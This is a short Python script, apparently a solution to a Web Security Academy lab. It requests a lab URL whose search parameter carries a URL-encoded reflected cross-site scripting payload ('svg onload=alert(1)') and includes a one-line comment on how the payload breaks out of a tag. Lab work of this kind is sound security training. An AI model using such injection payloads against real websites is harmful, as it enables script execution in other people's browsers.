import requests

url = "https://0a32008204415e51c12c03a800090095.web-security-academy.net/?search=%3E%22%3Csvg+onload%3Dalert%281%29%3E"
#explain payload: >" is close tag image 

solution = requests.get(url)

print(solution.content)